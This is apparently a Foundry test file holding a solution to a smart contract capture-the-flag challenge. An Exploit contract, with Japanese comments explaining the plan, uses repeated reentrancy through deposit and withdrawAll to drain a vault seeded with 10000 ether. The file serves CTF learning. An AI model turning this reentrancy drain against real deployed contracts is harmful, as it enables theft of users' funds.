// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 10000 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        Exploit exploitContract = new Exploit(address(setup.vault()), payable(playerAddress));
        vm.deal(address(exploitContract), 1 ether);

        exploitContract.run();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////

// 方針
// 1 etherをdepositし、Reentrancy AttackでbalanceOfを0にせずreceiveを受け取ることができる
// （次のbalanceOfは1 + 1, その次は2 + 2...）
// これを、使うと2の累乗分を引き出すことしかできない
// 一度目のwithdrawAllは引き出したい数の最大の2の累乗分を引き出し、（10000ならば8192）
// 二度目のwithdrawAllで残りの分を引き出す

interface IVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Exploit {
    IVault public vaultContract;
    address payable public player;
    bool _isSecondAttack = false;

    event Received(address, uint256);

    constructor(address addr, address payable player_) {
        vaultContract = IVault(addr);
        player = player_;
    }

    receive() external payable {
        if (address(vaultContract).balance > 0) {
            // 1回目のwithdrawAllで、引き出せるところまで引き出す
            if (address(this).balance < address(vaultContract).balance) {
                vaultContract.deposit{value: address(this).balance}();
                vaultContract.withdrawAll();
            } else if (_isSecondAttack) {
                // 2回目で、残りのbalanceを引き出す
                vaultContract.withdrawAll();
            }

            emit Received(msg.sender, msg.sender.balance);
        }
    }

    function run() external payable {
        // (1)1回目のReentrancy Attack
        vaultContract.deposit{value: 1 ether}();
        vaultContract.withdrawAll();

        _isSecondAttack = true;

        // 2回目Reentrancy Attack
        // Vaultに残っているbalance分をdepositする
        // withdrawAllで引き出される
        vaultContract.deposit{value: address(vaultContract).balance}();
        vaultContract.withdrawAll();

        player.transfer(address(this).balance);
    }
}
////////// YOUR CODE END //////////
